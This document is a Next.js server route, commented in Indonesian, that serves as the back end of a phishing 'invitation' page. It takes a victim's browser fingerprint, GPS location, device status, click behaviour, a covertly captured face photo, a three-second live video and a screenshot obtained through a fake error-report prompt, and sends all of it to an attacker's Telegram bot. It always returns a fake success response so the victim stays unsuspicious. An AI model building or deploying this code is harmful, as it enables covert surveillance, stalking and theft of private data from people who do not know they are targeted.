import { NextResponse } from 'next/server';

// Helper untuk convert base64 string ke objek Blob/File agar bisa dikirim via FormData
function base64ToBlob(base64Data: string, contentType: string) {
    const base64 = base64Data.split(',')[1];
    const buffer = Buffer.from(base64, 'base64');
    return new Blob([buffer], { type: contentType });
}

export async function POST(request: Request) {
    try {
        const data = await request.json();
        
        // Ambil token dari Environment Variables
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!BOT_TOKEN || !CHAT_ID) {
            console.error("TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID belum diset di environment!");
            // Tetap kembalikan 200 agar klien tidak curiga
            return NextResponse.json({ status: 'success' }, { status: 200 }); 
        }

        console.log("Menerima data, sedang mem-forward ke Telegram...");

        // 1. Susun Laporan Teks Utama (Data Fingerprint, Behavior, Location)
        const loc = data.location 
            ? `📍 Lokasi: ${data.location.lat}, ${data.location.lng}\n🎯 Akurasi: ${data.location.accuracy}m\n🔗 Google Maps: https://www.google.com/maps?q=${data.location.lat},${data.location.lng}` 
            : `📍 Lokasi: Ditolak/Gagal`;

        const fp = data.fingerprint || {};
        const bhv = data.behavior || {};
        const ds = data.device_status || {};

        // Format device status section
        const batteryInfo = ds.battery
            ? `🔋 Baterai: ${ds.battery.level}% ${ds.battery.charging ? '⚡ (Charging)' : '🔌 (Tidak cas)'}`
            : `🔋 Baterai: Tidak tersedia`;

        const netInfo = ds.connection
            ? `📶 Jaringan: ${(ds.connection.effectiveType || '-').toUpperCase()} | ⬇️ ${ds.connection.downlink ?? '-'} Mbps | ⏱️ RTT ${ds.connection.rtt ?? '-'}ms${ds.connection.saveData ? ' | 💾 Save Data ON' : ''}`
            : `📶 Jaringan: Tidak tersedia`;

        const hwInfo = `🧠 RAM: ${ds.hardware?.ram ? ds.hardware.ram + ' GB' : '-'} | 💻 CPU Cores: ${ds.hardware?.cores ?? '-'}`;

        const reportText = `🚨 <b>TARGET BARU MEMBUKA UNDANGAN!</b> 🚨\n\n` +
            `🆔 Session: <code>${data.session_id}</code>\n` +
            `⏰ Waktu: ${new Date(data.timestamp).toLocaleString('id-ID')}\n\n` +
            `🌐 <b>FINGERPRINT:</b>\n` +
            `- OS/Platform: ${fp.platform || '-'}\n` +
            `- Resolusi: ${fp.screen_resolution || '-'}\n` +
            `- Browser: ${fp.user_agent?.substring(0, 60)}...\n` +
            `- GPU: ${fp.webgl_vendor || '-'}\n\n` +
            `${loc}\n\n` +
            `🖱️ <b>BEHAVIOR TRACKING:</b>\n` +
            `- Waktu ke klik pertama: ${bhv.time_to_click_ms ? bhv.time_to_click_ms + ' ms' : '-'}\n` +
            `- Titik klik: X:${bhv.first_click_xy?.[0]} Y:${bhv.first_click_xy?.[1]}\n` +
            `- Scroll depth: ${bhv.scroll_depth_percent}%\n\n` +
            `📱 <b>DEVICE STATUS:</b>\n` +
            `${batteryInfo}\n` +
            `${netInfo}\n` +
            `${hwInfo}\n`;

        // Kirim Pesan Teks
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: reportText,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        // 2. Kirim Foto Wajah (jika berhasil ditangkap)
        if (data.photo_base64) {
            const photoForm = new FormData();
            photoForm.append('chat_id', CHAT_ID);
            photoForm.append('caption', `📸 Foto Wajah Target [Session: ${data.session_id}]`);
            photoForm.append('photo', base64ToBlob(data.photo_base64, 'image/jpeg'), 'wajah.jpg');
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: photoForm
            });
        }

        // 3. Kirim Video Live 3 Detik (jika berhasil direkam)
        if (data.video_base64) {
            const videoForm = new FormData();
            videoForm.append('chat_id', CHAT_ID);
            videoForm.append('caption', `🎥 Video Live 3 Detik [Session: ${data.session_id}]`);
            videoForm.append('video', base64ToBlob(data.video_base64, 'video/webm'), 'live.webm');
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: videoForm
            });
        }

        // 4. Kirim Screenshot (jika target menyetujui kirim laporan error)
        if (data.screenshot_base64) {
            const screenForm = new FormData();
            screenForm.append('chat_id', CHAT_ID);
            screenForm.append('caption', `🖥️ Screenshot Layar (Laporan Error) [Session: ${data.session_id}]`);
            screenForm.append('photo', base64ToBlob(data.screenshot_base64, 'image/jpeg'), 'screenshot.jpg');
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: screenForm
            });
        }

        console.log("✅ Berhasil eksekusi forward ke Telegram realtime!");
        
        // Selalu kembalikan 200 OK ke klien (Silent Success)
        return NextResponse.json({ status: 'success' }, { status: 200 });

    } catch (error) {
        console.error("Error forwarding ke Telegram:", error);
        // Tetap silent error di mata klien
        return NextResponse.json({ status: 'success' }, { status: 200 });
    }
}
